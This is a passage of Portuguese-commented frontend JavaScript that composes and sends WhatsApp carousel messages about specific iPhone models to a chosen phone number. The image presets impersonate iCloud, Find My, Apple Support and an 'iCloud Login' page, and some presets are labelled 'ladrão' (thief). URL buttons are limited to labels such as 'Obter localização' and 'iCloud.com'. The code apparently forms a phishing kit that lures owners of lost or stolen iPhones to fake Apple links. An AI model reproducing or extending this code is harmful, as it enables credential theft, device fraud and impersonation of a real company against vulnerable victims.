        await authFetch('/ui/log', {
            method: 'POST',
            body: { event, details }
        });
    } catch (_) { }
};

// --- Funções para Gerenciar Modelos de Carrossel ---

function populateCarouselTemplatesDropdown() {
    const selectTemplate = document.getElementById("carouselTemplate");
    selectTemplate.innerHTML = '<option value="">-- Selecione a Série do iPhone --</option>'; // Texto do placeholder
    carouselTemplates.forEach(template => {
        const option = document.createElement("option");
        option.value = template.id;
        option.textContent = template.name;
        selectTemplate.appendChild(option);
    });
}

function loadCarouselTemplate() {
    const selectTemplate = document.getElementById("carouselTemplate");
    const selectedTemplateId = selectTemplate.value;
    const selectedTemplate = carouselTemplates.find(t => t.id === selectedTemplateId);

    // Limpa os campos antes de carregar o novo template
    document.getElementById("mensagemGeral").value = "";
    document.getElementById("delayMessage").value = "";
    document.getElementById("carousel-cards-container").innerHTML = "";
    cardIndexCounter = 0;

    if (!selectedTemplate) {
        // Se nenhum template for selecionado, adiciona um cartão vazio e a mensagem geral conforme idioma.
        const gm = generalCarouselMessageTemplateLang[window.cardTextLang] || generalCarouselMessageTemplateLang.pt;
        const mgEl = document.getElementById("mensagemGeral");
        if (mgEl) {
            mgEl.removeAttribute('readonly');
            mgEl.value = gm;
        }
        addCarouselCard();
        return;
    }

    // Define a mensagem geral do template conforme idioma
    const gm = generalCarouselMessageTemplateLang[window.cardTextLang] || generalCarouselMessageTemplateLang.pt;
    const mgEl = document.getElementById("mensagemGeral");
    if (mgEl) {
        mgEl.removeAttribute('readonly');
        mgEl.value = gm;
    }

    document.getElementById("delayMessage").value = selectedTemplate.delay;

    // Ao carregar um template, adiciona os cartões padrão do template.
    // O addCarouselCard agora lida com o preenchimento inicial dos selects.
    selectedTemplate.cards.forEach(cardData => {
        addCarouselCard({
            ...cardData,
            subModelsList: selectedTemplate.subModels // Passa a lista completa de subModelos para o cartão
        });
    });
}

function addCarouselCard(cardData = null) {
    cardIndexCounter++;
    const currentCardId = cardIndexCounter;
    const container = document.getElementById('carousel-cards-container');
    const cardDiv = document.createElement('div');
    cardDiv.className = 'card-editor bg-transparent backdrop-blur-xl p-6 rounded-xl shadow border border-white/20 mb-6';
    cardDiv.setAttribute('data-card-id', currentCardId);

    cardDiv.innerHTML = `
        <h3 class="text-lg font-semibold text-white mb-4">Cartão #${currentCardId}</h3>
        <div class="space-y-3">
            <div>
                <label for="card-model-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">Modelo de iPhone:</label>
                <select id="card-model-${currentCardId}" 
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">
                    <option value="">Selecione o Modelo</option>
                </select>
            </div>

            <div class="flex space-x-4">
                <div class="flex-1">
                    <label for="card-capacity-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">Capacidade (GB):</label>
                    <select id="card-capacity-${currentCardId}" 
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">
                        <option value="">Selecione</option>
                    </select>
                </div>
                <div class="flex-1">
                    <label for="card-color-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">Cor:</label>
                    <select id="card-color-${currentCardId}" 
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">
                        <option value="">Selecione</option>
                    </select>
                </div>
            </div>

            <div class="flex space-x-4 mt-2">
                <div class="flex-1">
                    <label for="card-lang-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">Idioma do texto:</label>
                    <select id="card-lang-${currentCardId}"
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">
                        <option value="pt">Português</option>
                        <option value="en">English</option>
                        <option value="es">Español</option>
                    </select>
                </div>
            </div>

            <div>
                <label for="card-text-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">Texto do Cartão (Editável):</label>
                <textarea id="card-text-${currentCardId}" rows="15" placeholder="O texto final do seu cartão será gerado aqui. Você pode ajustar."
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm"></textarea>
            </div>

            <div>
                <div class="flex items-start gap-4">
                    <div class="flex-1">
                        <label for="card-image-source-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">Fonte da Imagem:</label>
                        <select id="card-image-source-${currentCardId}"
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">
                            <option value="icloud">iCloud Premium</option>
                            <option value="icloud_plus">iCloud+</option>
                            <option value="icloud_plus_plus">iCloud++</option>
                            <option value="find_my">FInd My</option>
                            <option value="iphones_plus">iPhones +</option>
                            <option value="findmy_plus">FIndMy+</option>
                            <option value="buscar_dispositivos">Buscar Dispositivos</option>
                            <option value="macbook">MacBook</option>
                            <option value="iplace">iPlace</option>
                            <option value="suporte_apple">Suporte Apple</option>
                            <option value="suporte_apple_plus_plus">suporte apple++</option>
                            <option value="suporte_apple_plus_plus_plus">suporte Apple +++</option>
                            <option value="ladrao">Ladrão</option>
                            <option value="ladrao1">ladrao1</option>
                            <option value="landrao2">Landrão2</option>
                            <option value="ladrao4">ladrao 4</option>
                            <option value="ladrao3">ladrao3</option>
                            <option value="default">iCloud Login</option>
                            <option value="manual">URL Manual</option>
                         </select>
                     </div>
                    <div class="flex-1" id="card-image-url-field-${currentCardId}">
                        <label for="card-image-${currentCardId}" class="block text-sm font-medium text-white/80 mb-1">URL da Imagem do Cartão:</label>
                        <div class="flex gap-2">
                            <input type="url" id="card-image-${currentCardId}" placeholder="https://exemplo.com/imagem.jpg"
      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />
                            <button type="button" id="card-image-preview-btn-${currentCardId}"
      class="px-3 py-2 bg-white/10 border border-white/20 rounded-xl text-white hover:bg-white/15 transition">Pré-visualizar</button>
                        </div>
                    </div>
    <div class="w-40 h-28 border border-white/20 bg-white/5 rounded-xl overflow-hidden">
                        <img id="card-image-preview-${currentCardId}" alt="Prévia da imagem" class="w-full h-full object-cover hidden" />
                        <div id="card-image-preview-placeholder-${currentCardId}" class="w-full h-full flex items-center justify-center text-white/50 text-xs">Prévia</div>
                    </div>
                </div>
            </div>
        </div>
        
        <h4 class="text-md font-semibold text-white mt-6 mb-3">Botões do Cartão #${currentCardId}</h4>
        <div id="card-buttons-container-${currentCardId}" class="space-y-3">
            </div>
        <div class="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2 mt-4">
  <button type="button" class="add-button-btn flex-grow py-2 bg-emerald-600 text-white font-medium rounded-xl shadow hover:bg-emerald-700 focus:outline-none focus:ring-2 focus:ring-emerald-400/50 transition duration-150 ease-in-out"
                                 onclick="addCardButton(${currentCardId})">
                + Adicionar Botão
            </button>
  <button type="button" class="remove-card-btn tab-btn shrink-0 px-2 py-1 sm:px-2 sm:py-1.5 md:px-3 md:py-2 text-xs sm:text-xs md:text-sm leading-[1.2] whitespace-nowrap tracking-tight rounded-none border border-red-400/40 bg-red-500/20 hover:bg-red-500/30 text-red-200 font-semibold transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-400/30 hover:shadow hover:shadow-red-500/20 active:translate-y-[1px]"
                                 onclick="removeCarouselCard(${currentCardId})">
                - Remover Cartão
            </button>
        </div>
    `;
    container.appendChild(cardDiv);

    const iPhoneModelSelect = document.getElementById(`card-model-${currentCardId}`);
    // Popula o select de modelo com os sub-modelos da SÉRIE
    if (cardData && cardData.subModelsList && cardData.subModelsList.length > 0) {
        populateiPhoneModelSelect(iPhoneModelSelect, cardData.subModelsList);
        // Tenta pré-selecionar o valor do modelo se estiver nos dados do cartão (útil ao carregar templates)
        if (cardData.cardModelValue) {
            iPhoneModelSelect.value = cardData.cardModelValue;
        }
    }

    const cardTextarea = document.getElementById(`card-text-${currentCardId}`);
    const baseText = (cardData && cardData.text) ? cardData.text : getDefaultCardTextByLang();
    cardTextarea.value = baseText;
    cardTextarea.setAttribute('data-template-text', baseText);

    const cardImageInput = document.getElementById(`card-image-${currentCardId}`);
    if (cardImageInput) {
        cardImageInput.value = (cardData && cardData.image) ? cardData.image : "https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg";
    } else {
        console.error(`Erro: Input com ID card-image-${currentCardId} não encontrado após append!`);
    }

    // Função para atualizar a prévia da imagem
    const updatePreview = () => {
        const imgEl = document.getElementById(`card-image-preview-${currentCardId}`);
        const placeholderEl = document.getElementById(`card-image-preview-placeholder-${currentCardId}`);
        const url = (document.getElementById(`card-image-${currentCardId}`)?.value || '').trim();
        if (!imgEl || !placeholderEl) return;
        if (!url) {
            imgEl.classList.add('hidden');
            placeholderEl.textContent = 'Prévia';
            placeholderEl.classList.remove('hidden');
            return;
        }
        imgEl.onload = () => {
            imgEl.classList.remove('hidden');
            placeholderEl.classList.add('hidden');
        };
        imgEl.onerror = () => {
            imgEl.classList.add('hidden');
            placeholderEl.textContent = 'Falha ao carregar';
            placeholderEl.classList.remove('hidden');
        };
        imgEl.src = url;
    };

    if (cardData && cardData.buttons && cardData.buttons.length > 0) {
        cardData.buttons.forEach(button => {
            addCardButton(currentCardId, button);
        });
    } else {
        addCardButton(currentCardId, { type: "URL", label: "Obter localização", url: "" });
        addCardButton(currentCardId, { type: "REPLY", label: "Falar com atendente", url: "" });
    }

    // AGORA OS EVENT LISTENERS SÃO ADICIONADOS APÓS O ELEMENTO SER INSERIDO NO DOM
    // E DELEGAM A ATUALIZAÇÃO DOS DROPDOWNS SECUNDÁRIOS E DO TEXTO.
    document.getElementById(`card-model-${currentCardId}`).addEventListener('change', () => updateCapacityAndColorSelects(currentCardId));
    document.getElementById(`card-capacity-${currentCardId}`).addEventListener('change', () => updateCardText(currentCardId)); // Capacidade só atualiza o texto
    document.getElementById(`card-color-${currentCardId}`).addEventListener('change', () => updateCardText(currentCardId));     // Cor só atualiza o texto
    const cardLangSelect = document.getElementById(`card-lang-${currentCardId}`);
    if (cardLangSelect) {
        // Define idioma inicial conforme global
        cardLangSelect.value = window.cardTextLang || 'pt';
        cardLangSelect.addEventListener('change', (e) => {
            const lang = e.target.value || 'pt';
            // Usa o seletor para definir idioma global, atualizar todos os cartões e a mensagem geral
            if (typeof window.setCardLanguage === 'function') {
                window.setCardLanguage(lang);
            } else {
                // Fallback: atualiza somente este cartão
                const textarea = document.getElementById(`card-text-${currentCardId}`);
                if (textarea) {
                    const base = (defaultCardTemplateTextLang[lang] || defaultCardTemplateTextLang.pt);
                    textarea.setAttribute('data-template-text', base);
                    updateCardText(currentCardId);
                }
                const mensagemGeralInput = document.getElementById('mensagemGeral');
                if (mensagemGeralInput) {
                    const gm = generalCarouselMessageTemplateLang[lang] || generalCarouselMessageTemplateLang.pt;
                    mensagemGeralInput.value = gm;
                }
            }
        });
    }

    // Seletor de fonte da imagem e preview
    const cardImageSourceSelect = document.getElementById(`card-image-source-${currentCardId}`);
    const cardImagePreviewBtn = document.getElementById(`card-image-preview-btn-${currentCardId}`);
    if (cardImageSourceSelect) {
        const presetImages = {
            icloud: 'https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg',
            icloud_plus: 'https://s2-techtudo.glbimg.com/rZTKuZsm2P2O513ocqqI645hlkk=/0x0:984x566/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_08fbf48bc0524877943fe86e43087e7a/internal_photos/bs/2025/m/0/PWv8nrR1OX7FeNomGu3g/icloud-plus-what.jpg',
            icloud_plus_plus: 'https://www.apple.com/v/icloud/af/images/meta/og__cu0qwzuuysq6_overview.png',
            find_my: 'https://www.edivaldobrito.com.br/wp-content/uploads/2025/02/os-melhores-acessorios-find-my-para-facilitar-seu-dia-a-dia.webp',
            iphones_plus: 'https://www.remessaonline.com.br/blog/wp-content/uploads/2024/09/iphones-que-ainda-atualizam-1200x900.png',
            findmy_plus: 'https://www.apple.com/br/icloud/images/meta/og__cu0qwzuuysq6_findmy.png?202506270738',
            buscar_dispositivos: 'https://cdsassets.apple.com/live/7WUAS350/images/icloud/locale/pt-br/ios-17-macos-sonoma-iphone-15-pro-find-my-hero.png',
            macbook: 'https://m.media-amazon.com/images/I/41J9j6iVDvS._AC_UF1000,1000_QL80_.jpg',
            iplace: 'https://blog.iplace.com.br/wp-content/uploads/2025/07/iplace-apple-1-1024x544.jpg',
            suporte_apple: 'https://i.ibb.co/pB5YVy1d/6594b616-b237-4a30-a5a0-0a0af2f3e9e6.jpg',
            suporte_apple_plus_plus: 'https://i.ibb.co/k7W8q88/cffebd1f-fb6f-4e9c-9bd2-754fd673fb37.jpg',
            suporte_apple_plus_plus_plus: 'https://i.ibb.co/v6zHv74w/f208175e-162f-40c4-b7be-65fc3aa2eae7.jpg',
            ladrao: 'https://i.ibb.co/4ZrhMwCP/97b9bd6c-ee00-4ef7-a8d9-d46c5e9315c8.jpg',
            ladrao1: 'https://i.ibb.co/Y4TK5QQt/Whats-App-Image-2024-09-08-at-18-10-44.jpg',
            landrao2: 'https://i.ibb.co/27hnjTB6/Whats-App-Image-2024-09-25-at-17-43-16.jpg',
            ladrao4: 'https://i.ibb.co/fdJSh88Z/Whats-App-Image-2025-03-24-at-14-56-53.jpg',
            ladrao3: 'https://i.ibb.co/cK9Fzzng/Whats-App-Image-2024-11-04-at-10-45-11.jpg',
            default: 'https://cdn.mos.cms.futurecdn.net/Cdpw6TMsvTS3tPWmYuVXz6-1200-80.png'
        };

        // Estado inicial: apenas "URL Manual" permite editar o campo
        {
            const imageInputEl = document.getElementById(`card-image-${currentCardId}`);
            if (imageInputEl) imageInputEl.readOnly = (cardImageSourceSelect.value !== 'manual');
        }

        // Esconder/mostrar campo de URL conforme a fonte selecionada
        const urlFieldWrap = document.getElementById(`card-image-url-field-${currentCardId}`);
        if (urlFieldWrap) {
            urlFieldWrap.classList.toggle('hidden', cardImageSourceSelect.value !== 'manual');
        }

        cardImageSourceSelect.addEventListener('change', (e) => {
            const val = e.target.value;
            const input = document.getElementById(`card-image-${currentCardId}`);
            if (!input) return;

            const isManual = (val === 'manual');
            input.readOnly = !isManual; // Bloqueia edição quando não for manual
            if (urlFieldWrap) urlFieldWrap.classList.toggle('hidden', !isManual);

            if (isManual) {
                // Limpa o campo para o usuário colar sua própria URL
                input.value = '';
                updatePreview();
                return;
            }
            const preset = presetImages[val];
            if (preset) {
                input.value = preset;
                updatePreview();
            }
        });
    }
    if (cardImageInput) {
        cardImageInput.addEventListener('change', updatePreview);
    }
    if (cardImagePreviewBtn) {
        cardImagePreviewBtn.addEventListener('click', updatePreview);
    }
    // Atualiza preview inicial
    updatePreview();

    // Chamada inicial para garantir que todos os selects secundários e o texto estejam corretos
    // mesmo que o modelo padrão já venha selecionado no template.
    updateCapacityAndColorSelects(currentCardId);

    // Enhance selects do cartão com dropdown estilizado
    if (window.enhanceSelect) {
        const modelSelect = document.getElementById(`card-model-${currentCardId}`);
        const capacitySelect = document.getElementById(`card-capacity-${currentCardId}`);
        const colorSelect = document.getElementById(`card-color-${currentCardId}`);
        window.enhanceSelect(modelSelect);
        window.enhanceSelect(capacitySelect);
        window.enhanceSelect(colorSelect);
        if (cardLangSelect) window.enhanceSelect(cardLangSelect);
        const imageSourceSelect = document.getElementById(`card-image-source-${currentCardId}`);
        if (imageSourceSelect) window.enhanceSelect(imageSourceSelect);
        // Garante que dropdowns customizados reflitam as opções atuais imediatamente
        if (window.refreshEnhancedSelect) {
            window.refreshEnhancedSelect(modelSelect);
            window.refreshEnhancedSelect(capacitySelect);
            window.refreshEnhancedSelect(colorSelect);
            if (imageSourceSelect) window.refreshEnhancedSelect(imageSourceSelect);
        }
    }

    return currentCardId;
}


function addCardButton(cardId, buttonData = null) {
    const buttonsContainer = document.getElementById(`card-buttons-container-${cardId}`);
    if (!buttonsContainer) {
        console.error(`Contêiner de botões para o cartão ${cardId} not found.`);
        return;
    }
    const buttonDiv = document.createElement('div');
    buttonDiv.className = 'button-editor relative bg-transparent backdrop-blur-xl p-4 rounded-xl border border-white/30 shadow mb-3';
    const buttonIndex = buttonsContainer.children.length;

    const buttonUniqueId = `btn_${cardId}_${buttonIndex}`;

    // Estilo do botão "- Remover Botão":
    // Se for Cartão #3, aplicar a paleta/efeitos da aba "Sair" sem reduzir tamanho
    const removeBtnClass = (cardId === 3)
        ? 'remove-button-btn mt-4 px-4 py-2 rounded-xl border border-red-400/40 bg-red-500/20 hover:bg-red-500/30 text-red-200 font-medium transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-400/30 hover:shadow hover:shadow-red-500/20 active:translate-y-[1px]'
        : 'remove-button-btn mt-4 py-2 px-4 bg-red-600 text-white font-medium rounded-xl shadow hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-400/50 transition duration-150 ease-in-out';

    buttonDiv.innerHTML = `
        <div class="space-y-2">
            <div>
                <label for="button-type-${cardId}-${buttonIndex}" class="block text-sm font-medium text-white/80 mb-1">Tipo de Botão:</label>
                <select id="button-type-${cardId}-${buttonIndex}"
      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">
                    <option value="URL">URL</option>
                    <option value="REPLY">Resposta Rápida (Quick Reply)</option>
                    <option value="COPY">Copiar Texto</option>
                    <option value="CALL">Ligar</option>
                </select>
            </div>

            <div>
                <label for="button-label-${cardId}-${buttonIndex}" class="block text-sm font-medium text-white/80 mb-1">Texto do Botão:</label>
                <input type="text" id="button-label-${cardId}-${buttonIndex}" placeholder="Ex: Saiba Mais"
      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />
            </div>
            
            <div id="button-url-field-${cardId}-${buttonIndex}" class="button-field">
                <label for="button-url-${cardId}-${buttonIndex}" class="block text-sm font-medium text-white/80 mb-1">URL:</label>
                <input type="url" id="button-url-${cardId}-${buttonIndex}" placeholder="https://exemplo.com/link"
      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />
            </div>
            <div id="button-phone-field-${cardId}-${buttonIndex}" class="button-field hidden">
                <label for="button-phone-${cardId}-${buttonIndex}" class="block text-sm font-medium text-white/80 mb-1">Número de Telefone (com DDI, sem +):</label>
                <input type="text" id="button-phone-${cardId}-${buttonIndex}" placeholder="Ex: 5511999999999"
      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />
            </div>
            <div id="button-copy-field-${cardId}-${buttonIndex}" class="button-field hidden">
                <label for="button-copy-${cardId}-${buttonIndex}" class="block text-sm font-medium text-white/80 mb-1">Texto para Copiar:</label>
                <input type="text" id="button-copy-${cardId}-${buttonIndex}" placeholder="Ex: CUPOM20"
                                 class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />
            </div>
            <input type="hidden" id="button-id-${cardId}-${buttonIndex}" value="${buttonUniqueId}" />
        </div>
  <button type="button" class="${removeBtnClass}">
            - Remover Botão
        </button>
    `;
    buttonsContainer.appendChild(buttonDiv);

    // Estiliza campos dos tipos de botão para ficarem consistentes com os modelos (fundo/overlay)
    try {
        const btnTypeSelect = document.getElementById(`button-type-${cardId}-${buttonIndex}`);
        if (window.enhanceSelect && btnTypeSelect) {
            window.enhanceSelect(btnTypeSelect);
        }

        const urlField = document.getElementById(`button-url-field-${cardId}-${buttonIndex}`);
        const phoneField = document.getElementById(`button-phone-field-${cardId}-${buttonIndex}`);
        const copyField = document.getElementById(`button-copy-field-${cardId}-${buttonIndex}`);

        [urlField, phoneField, copyField].forEach(el => {
            if (el) {
                el.classList.add('bg-transparent', 'border', 'border-white/20', 'rounded-xl', 'p-3', 'backdrop-blur-xl');
            }
        });
        const labelInput = document.getElementById(`button-label-${cardId}-${buttonIndex}`);
        if (labelInput && labelInput.parentElement) {
            labelInput.parentElement.classList.add('bg-transparent', 'border', 'border-white/30', 'rounded-xl', 'p-3', 'backdrop-blur-xl');
        }
    } catch (e) {
        // silencioso
    }

    buttonDiv.querySelector('.remove-button-btn').onclick = () => removeCardButton(buttonDiv);

    // Liga o evento via JS para evitar handler inline
    const typeSelectEl = document.getElementById(`button-type-${cardId}-${buttonIndex}`);
    if (typeSelectEl) {
        typeSelectEl.addEventListener('change', () => toggleButtonFields(cardId, buttonIndex));
    }

    if (buttonData) {
        document.getElementById(`button-type-${cardId}-${buttonIndex}`).value = buttonData.type || 'URL';
        document.getElementById(`button-label-${cardId}-${buttonIndex}`).value = buttonData.label || '';
        if (buttonData.type === 'URL') {
            document.getElementById(`button-url-${cardId}-${buttonIndex}`).value = buttonData.url || '';
        } else if (buttonData.type === 'CALL') {
            document.getElementById(`button-phone-${cardId}-${buttonIndex}`).value = buttonData.phone || '';
        } else if (buttonData.type === 'COPY') {
            document.getElementById(`button-copy-${cardId}-${buttonIndex}`).value = buttonData.copyText || '';
        }
    } else {
        // Default ao adicionar novo botão manualmente: Quick Reply com texto "Falar com atendente"
        const typeEl = document.getElementById(`button-type-${cardId}-${buttonIndex}`);
        const labelEl = document.getElementById(`button-label-${cardId}-${buttonIndex}`);
        if (typeEl) typeEl.value = 'REPLY';
        if (labelEl && !labelEl.value) labelEl.value = 'Falar com atendente';
    }
    toggleButtonFields(cardId, buttonIndex);
}

// Opções permitidas para texto de botão do tipo URL
const ALLOWED_URL_LABELS = [
    "Obter localização",
    "iCloud.com",
    "Find.com",
    "Get location",
    "Obtener ubicación"
];

function toggleButtonFields(cardId, buttonIndex) {
    const buttonTypeSelect = document.getElementById(`button-type-${cardId}-${buttonIndex}`);
    if (!buttonTypeSelect) return;
    const buttonLabelInput = document.getElementById(`button-label-${cardId}-${buttonIndex}`);
    const buttonUrlField = document.getElementById(`button-url-field-${cardId}-${buttonIndex}`);
    const buttonPhoneField = document.getElementById(`button-phone-field-${cardId}-${buttonIndex}`);
    const buttonCopyField = document.getElementById(`button-copy-field-${cardId}-${buttonIndex}`);

    const buttonType = buttonTypeSelect.value;

    if (buttonUrlField) buttonUrlField.classList.add('hidden');
    if (buttonPhoneField) buttonPhoneField.classList.add('hidden');
    if (buttonCopyField) buttonCopyField.classList.add('hidden');

    // Aplica lista de sugestões/restrição ao texto do botão quando tipo for URL
    const labelDatalistId = `button-label-datalist-${cardId}-${buttonIndex}`;

    if (buttonType === 'URL') {
        if (buttonUrlField) buttonUrlField.classList.remove('hidden');
        if (buttonLabelInput && buttonLabelInput.value === "") {
            buttonLabelInput.value = "Obter localização";
        }
        if (buttonLabelInput) {
            let dl = document.getElementById(labelDatalistId);
            if (!dl) {
                dl = document.createElement('datalist');
                dl.id = labelDatalistId;
                dl.innerHTML = ALLOWED_URL_LABELS.map(v => `<option value="${v}"></option>`).join('');
                buttonLabelInput.parentElement.appendChild(dl);
            } else {
                dl.innerHTML = ALLOWED_URL_LABELS.map(v => `<option value="${v}"></option>`).join('');
            }
            buttonLabelInput.setAttribute('list', labelDatalistId);
        }
    } else if (buttonType === 'CALL') {
        if (buttonPhoneField) buttonPhoneField.classList.remove('hidden');
        if (buttonLabelInput && buttonLabelInput.value === "") {
            buttonLabelInput.value = "Ligar";
        }
    } else if (buttonType === 'COPY') {
        if (buttonCopyField) buttonCopyField.classList.remove('hidden');
        if (buttonLabelInput && buttonLabelInput.value === "") {
            buttonLabelInput.value = "Copiar Cupom";
        }
    } else if (buttonType === 'REPLY') {
        if (buttonLabelInput && buttonLabelInput.value === "") {
            buttonLabelInput.value = "Falar com atendente";
        }
    }

    // Remove lista de sugestões quando não for URL
    if (buttonType !== 'URL' && buttonLabelInput) {
        buttonLabelInput.removeAttribute('list');
        const old = document.getElementById(labelDatalistId);
        if (old) old.remove();
    }
}

function removeCarouselCard(cardId) {
    const cardDiv = document.querySelector(`.card-editor[data-card-id="${cardId}"]`);
    if (cardDiv) {
        cardDiv.remove();
    }
}

function removeCardButton(buttonElementDiv) {
    buttonElementDiv.remove();
}

async function enviarCarrossel() {
    const log = document.getElementById('log');

    const ddiSelect = document.getElementById('countryDDI');
    const rawNumero = document.getElementById('numero').value.trim();
    const selectedOption = ddiSelect && ddiSelect.options ? ddiSelect.options[ddiSelect.selectedIndex] : null;
    const ddiDigits = String(selectedOption ? (selectedOption.getAttribute('data-code') || '') : '').replace(/[^0-9]/g, '');
    let numeroCompleto = ddiDigits + rawNumero;

    // ADIÇÃO CRÍTICA: REMOVER QUALQUER '+' INICIAL DO NÚMERO COMPLETO
    numeroCompleto = numeroCompleto.replace(/^\+/, '');

    // O frontend não precisa enviar 'mensagemGeral' ou 'delayMessage' para o proxy
    // se o proxy já não as usa para o endpoint de carrossel da Z-API.
    // O backend já tem a responsabilidade de montar o payload exato para a Z-API.
    // Removendo-os daqui, evitamos enviar dados desnecessários.
    // const mensagemGeral = document.getElementById('mensagemGeral').value.trim();
    // const delayMessage = document.getElementById('delayMessage').value.trim();

    if (!rawNumero || !ddiDigits) {
        log.innerText = '❌ Por favor, preencha o DDI do país e o número do cliente.';
        return;
    }

    const carouselCards = [];
    const cardEditors = document.querySelectorAll('.card-editor');

    if (cardEditors.length === 0) {
        log.innerText = '❌ Por favor, adicione pelo menos um cartão ao carrossel.';
        return;
    }

    for (const cardEditor of cardEditors) {
        const cardId = cardEditor.getAttribute('data-card-id');

        const cardText = document.getElementById(`card-text-${cardId}`).value;
        const cardImage = document.getElementById(`card-image-${cardId}`).value.trim();

        if (!cardText || !cardImage) {
            log.innerText = `❌ O cartão #${cardId} requer texto e URL da imagem.`;
            return;
        }

        const cardButtons = [];
        const buttonEditors = cardEditor.querySelectorAll(`.button-editor`);

        for (let i = 0; i < buttonEditors.length; i++) {
            const buttonType = document.getElementById(`button-type-${cardId}-${i}`).value;
            const buttonLabel = document.getElementById(`button-label-${cardId}-${i}`).value.trim();
            const buttonId = document.getElementById(`button-id-${cardId}-${i}`).value.trim();
            const buttonUrl = document.getElementById(`button-url-${cardId}-${i}`)?.value.trim();
            const buttonPhone = document.getElementById(`button-phone-${cardId}-${i}`)?.value.trim();
            const buttonCopy = document.getElementById(`button-copy-${cardId}-${i}`)?.value.trim();

            if (!buttonLabel) {
                log.innerText = `❌ O botão #${i + 1} do cartão #${cardId} requer um texto (label).`;
                return;
            }

            // Restringe o texto do botão tipo URL às opções permitidas
            if (buttonType === 'URL') {
                if (!ALLOWED_URL_LABELS.includes(buttonLabel)) {
                    log.innerText = `❌ O texto do botão URL deve ser uma das opções: ${ALLOWED_URL_LABELS.join(', ')}`;
                    return;
                }
            }

            const button = {
                type: buttonType,
                label: buttonLabel,
                id: buttonId
            };

            if (buttonType === 'URL') {
                if (!buttonUrl) {
                    log.innerText = `❌ O botão URL #${i + 1} do cartão #${cardId} requer uma URL.`;
                    return;
                }
                button.url = normalizeUrlMaybe(buttonUrl);
            } else if (buttonType === 'CALL') {
                if (!buttonPhone) {
                    log.innerText = `❌ O botão de Chamada #${i + 1} do cartão #${cardId} requer um número de telefone.`;
                    return;
                }
                button.phone = buttonPhone;
            } else if (buttonType === 'COPY') {
                if (!buttonCopy) {
                    log.innerText = `❌ O botão de Copiar #${i + 1} do cartão #${cardId} requer um texto para copiar.`;
                    return;
                }
                button.copyText = buttonCopy;
            }

            cardButtons.push(button);
        }

        carouselCards.push({
            text: cardText,
            image: normalizeUrlMaybe(cardImage),
            buttons: cardButtons
        });
    }

    // O payload enviado do frontend para o PROXY (seu server.js)
    // Agora ele só inclui o 'phone' e o 'carousel' (seus cartões).
    // O 'server.js' faz o remapeamento para 'elements' e adiciona tokens na URL.
    const mensagemGeral = document.getElementById('mensagemGeral')?.value.trim() || '';
    const delayMessage = document.getElementById('delayMessage')?.value.trim() || '';
    const payloadToProxy = {
        phone: numeroCompleto,
        message: mensagemGeral,
        delayMessage,
        carousel: carouselCards // 'carouselCards' é o array de cartões do frontend
    };
    // --- ADIÇÃO DE LOG NO FRONTEND ---
    console.log("Payload enviado do frontend para o proxy:", JSON.stringify(payloadToProxy, null, 2));
    // --- FIM DA ADIÇÃO DE LOG ---
    try {
        log.innerHTML = 'Enviando sua mensagem, aguarde... <span class="loading-spinner"></span>';
        // A requisição é enviada para o seu próprio proxy (proxyCarouselUrl)
        const response = await authFetch(proxyCarouselUrl, {
            method: 'POST',
            body: payloadToProxy // Envia o payload simplificado para o proxy
        });

        const contentType = response.headers.get('content-type') || '';
        let data;
        if (contentType.includes('application/json')) {
            data = await response.json();
        } else {
            const rawText = await response.text();
            log.innerText = '⚠️ Resposta não-JSON recebida do proxy.\n'
                + `Status: ${response.status} ${response.statusText}\n`
                + `Content-Type: ${contentType}\n`
                + `Corpo bruto:\n${rawText}`;
            console.warn('Resposta não-JSON do proxy (carrossel):', { status: response.status, contentType, rawText });
            return;
        }

